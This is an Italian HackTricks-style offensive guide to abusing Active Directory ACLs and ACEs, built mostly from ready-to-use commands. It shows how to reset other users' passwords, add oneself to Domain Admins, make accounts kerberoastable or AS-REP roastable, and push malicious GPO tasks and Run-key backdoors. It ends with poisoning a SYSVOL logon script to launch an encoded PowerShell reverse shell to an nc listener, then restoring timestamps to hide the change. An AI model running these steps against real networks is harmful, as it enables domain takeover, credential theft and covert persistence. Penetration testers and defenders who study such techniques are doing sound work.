# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è per lo più un riassunto delle tecniche tratte da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consultare gli articoli originali.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Diritti GenericAll su account utente**

Questo privilegio concede a un attaccante il controllo completo su un account utente di destinazione. Una volta che i diritti `GenericAll` sono confermati usando il comando `Get-ObjectAcl`, un attaccante può:

- **Cambiare la password dell'utente di destinazione**: Usando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
- Da Linux, è possibile fare lo stesso tramite SAMR con Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se l'account è disabilitato, rimuovi il flag UAC**: `GenericAll` consente di modificare `userAccountControl`. Da Linux, BloodyAD può rimuovere il flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Assegna un SPN all'account dell'utente per rendere l'account kerberoastable, quindi usa Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` su un utente puoi aggiungere una credenziale basata su certificato e autenticarti come quell'utente senza cambiare la sua password. Vedi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Diritti GenericAll su un gruppo**

Questo privilegio consente a un attaccante di manipolare le appartenenze ai gruppi se ha i diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il distinguished name del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o usando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando detieni GenericAll/Write membership su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente accesso WinRM sui host che rispettano quel gruppo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Il possesso di questi privilegi su un oggetto computer o su un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: Consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: Permette di impersonare un computer o un account utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty on Group**

Se un utente ha i diritti `WriteProperty` su tutti gli oggetti di uno specifico gruppo (es., `Domain Admins`), può:

- **Add Themselves to the Domain Admins Group**: Raggiungibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo permette l'escalation dei privilegi all'interno del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Questo privilegio consente agli attaccanti di aggiungere se stessi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza al gruppo. L'utilizzo della seguente sequenza di comandi permette l'auto-aggiunta:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Privilegio simile che consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se possiedono il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Possedere il `ExtendedRight` su un utente per `User-Force-Change-Password` consente di resettare la password senza conoscere quella corrente. La verifica di questo permesso e il suo sfruttamento possono essere eseguiti tramite PowerShell o strumenti da riga di comando alternativi, offrendo diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liner per ambienti non interattivi. I comandi vanno da semplici invocazioni PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su gruppo**

Se un attacker scopre di avere i diritti `WriteOwner` su un gruppo, può cambiare il proprietario del gruppo assegnandolo a sé stesso. Questo è particolarmente rilevante quando il gruppo in questione è `Domain Admins`, poiché cambiare il proprietario consente un controllo più ampio sugli attributi del gruppo e sui suoi membri. Il processo consiste nell'identificare l'oggetto corretto tramite `Get-ObjectAcl` e poi usare `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che per nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su User**

Questa autorizzazione permette a un attaccante di modificare le proprietà di un utente. Nello specifico, con accesso `GenericWrite` l'attaccante può cambiare il percorso dello script di logon di un utente per eseguire uno script dannoso all'accesso dell'utente. Ciò viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target in modo che punti allo script dell'attaccante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo comporta la creazione di un oggetto credenziale, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche di appartenenza con comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Da Linux, Samba `net` può aggiungere/rimuovere membri quando si possiede `GenericWrite` sul gruppo (utile quando PowerShell/RSAT non sono disponibili):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Possedere un oggetto AD e avere i privilegi `WriteDACL` su di esso consente a un attaccante di concedersi privilegi `GenericAll` sull'oggetto. Questo viene realizzato tramite manipolazione di ADSI, permettendo il pieno controllo sull'oggetto e la possibilità di modificare le appartenenze ai gruppi. Nonostante ciò, esistono limitazioni nel tentativo di sfruttare questi privilegi usando i cmdlets `Set-Acl` / `Get-Acl` del modulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Quando si dispone di `WriteOwner` e `WriteDacl` su un account utente o account di servizio, è possibile assumere il controllo completo e reimpostare la sua password usando PowerView senza conoscere la vecchia password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Note:
- Potrebbe essere necessario prima impostare te stesso come proprietario se hai solo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Convalidare l'accesso con qualsiasi protocollo (SMB/LDAP/RDP/WinRM) dopo la reimpostazione della password.

## **Replica sul dominio (DCSync)**

L'attacco DCSync sfrutta permessi di replica specifici sul dominio per imitare un Domain Controller e sincronizzare i dati, comprese le credenziali utente. Questa tecnica potente richiede permessi come `DS-Replication-Get-Changes`, permettendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Per saperne di più sull'attacco DCSync qui.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato per gestire i Group Policy Objects (GPOs) può rappresentare rischi significativi per la sicurezza. Per esempio, se a un utente come `offense\spotless` vengono delegate le autorizzazioni di gestione delle GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl**, e **WriteOwner**. Questi permessi possono essere abusati per scopi maligni, come identificato con PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerare i permessi GPO

Per identificare GPO mal configurate, i cmdlet di PowerSploit possono essere concatenati. Questo permette di scoprire le GPO che un utente specifico può gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer con una specifica policy applicata**: È possibile determinare a quali computer si applica una GPO specifica, aiutando a comprendere l'ambito dell'impatto potenziale. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policy applicate a un dato computer**: Per vedere quali policy sono applicate a un particolare computer, si possono utilizzare comandi come `Get-DomainGPO`.

**OU con una data policy applicata**: Identificare le organizational units (OU) interessate da una specifica policy può essere fatto usando `Get-DomainOU`.

È inoltre possibile usare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare le GPO e trovare problemi.

### Abuso delle GPO - New-GPOImmediateTask

Le GPO mal configurate possono essere sfruttate per eseguire codice, ad esempio creando un'attività pianificata immediata. Questo può essere utilizzato per aggiungere un utente al gruppo local administrators sulle macchine interessate, elevando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il GroupPolicy module, se installato, consente la creazione e il collegamento di nuove GPOs e l'impostazione di preferenze, come valori di registro, per eseguire backdoors sui computer interessati. Questo metodo richiede che la GPO venga aggiornata e che un utente effettui il login sul computer per l'esecuzione:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre un metodo per abusare di GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuovi GPO. Questo strumento richiede la modifica dei GPO esistenti o l'uso degli strumenti RSAT per crearne di nuovi prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'aggiornamento delle policy

Gli aggiornamenti delle GPO avvengono tipicamente ogni ~90 minuti. Per accelerare questo processo, soprattutto dopo aver applicato una modifica, è possibile eseguire il comando `gpupdate /force` sul computer target per forzare un aggiornamento immediato delle policy. Questo comando assicura che eventuali modifiche alle GPO vengano applicate senza attendere il prossimo ciclo automatico di aggiornamento.

### Dietro le quinte

Ispezionando le Scheduled Tasks per una GPO specifica, come `Misconfigured Policy`, è possibile confermare l'aggiunta di task come `evilTask`. Queste attività vengono create tramite script o strumenti da linea di comando volti a modificare il comportamento del sistema o a scalare privilegi.

La struttura del task, come mostrata nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli dell'attività pianificata — incluso il comando da eseguire e i suoi trigger. Questo file rappresenta come le scheduled tasks vengono definite e gestite all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'enforcement della policy.

### Utenti e Gruppi

Le GPO permettono anche la manipolazione delle membership di utenti e gruppi sui sistemi target. Modificando direttamente i file di policy Users and Groups, un attaccante può aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Ciò è possibile tramite la delega delle permission di gestione delle GPO, che consente la modifica dei file di policy per includere nuovi utenti o cambiare le membership dei gruppi.

Il file di configurazione XML per Users and Groups illustra come queste modifiche vengono implementate. Aggiungendo voci a questo file, utenti specifici possono ricevere privilegi elevati sui sistemi interessati. Questo metodo offre un approccio diretto all'escalation di privilegi tramite la manipolazione delle GPO.

Inoltre, possono essere considerate ulteriori metodologie per l'esecuzione di codice o il mantenimento della persistenza, come sfruttare logon/logoff scripts, modificare chiavi di registro per autoruns, installare software tramite file .msi, o modificare le configurazioni dei servizi. Queste tecniche forniscono diverse vie per mantenere l'accesso e controllare i sistemi target attraverso l'abuso delle GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Individuare logon scripts
- Ispeziona gli attributi utente per la presenza di un logon script configurato:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Scansionare domain shares per far emergere shortcuts o riferimenti a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizzare i file `.lnk` per risolvere i target che puntano in SYSVOL/NETLOGON (utile trucco DFIR e per attaccanti senza accesso diretto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound mostra l'attributo `logonScript` (scriptPath) sui nodi utente quando presente.

### Verifica l'accesso in scrittura (non fidarti di share listings)
Gli strumenti automatici possono mostrare SYSVOL/NETLOGON come di sola lettura, ma le NTFS ACLs sottostanti possono comunque consentire operazioni di scrittura. Verifica sempre:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se la dimensione del file o mtime cambia, hai permessi di scrittura. Conserva gli originali prima di modificare.

### Avvelena uno script di logon VBScript per RCE
Aggiungi un comando alla fine che avvii una PowerShell reverse shell (generata da revshells.com) e mantieni la logica originale per evitare di interrompere la funzionalità aziendale:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ascolta sul tuo host e attendi il prossimo interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Note:
- L'esecuzione avviene con il token dell'utente che effettua il login (non SYSTEM). L'ambito è il GPO link (OU, site, domain) che applica quello script.
- Pulizia: ripristinare il contenuto e i timestamp originali dopo l'uso.


## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
